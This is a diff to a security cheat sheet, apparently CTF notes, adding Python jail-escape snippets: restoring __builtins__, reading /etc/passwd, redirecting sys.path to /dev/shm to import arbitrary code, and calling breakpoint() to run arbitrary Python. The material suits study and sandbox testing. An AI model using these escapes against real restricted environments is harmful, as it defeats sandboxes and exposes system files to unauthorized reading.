@@ -92,9 +92,14 @@ $ bind -f /etc/passwd
 Find variables and information about your context:
 
 ```py
-globals()     # ...
-locals()      # ...
-vars()        # ...
+globals()     # global symbols (variables, functions)
+locals()      # local symbols (function, method, block)
+vars()        # without any argument, same as 'locals'
+```
+
+```py
+__builtins__.__dict__
+del __builtins__  # restore them
 ```
 
 #### Python File Write
@@ -104,9 +109,16 @@ You can arbitrarily create files or python scripts using:
 ```py
 print("Hello, World!", file=open("/dev/shm/poc", "w"))
 ```
+
+#### Python File Read
+
+```py
+file=open("/etc/passwd", "r"); print(''.join(file.readlines()))
+help('print') # :e/path/to/file
+```
 </div><div>
 
-#### Python Jails SetAttr
+#### Python Jails Escape
 
 Arbitrarily set a variable, such as the list of blocked commands:
 
@@ -119,6 +131,12 @@ Set the path to load arbitrary Python files:
 ```py
 setattr(__import__("sys"), "path", list(("/dev/shm/",)))
 __import__("my_file")
+```
+
+Use breakpoint:
+
+```py
+breakpoint() # then write any python code
 ```
 </div></div>
 
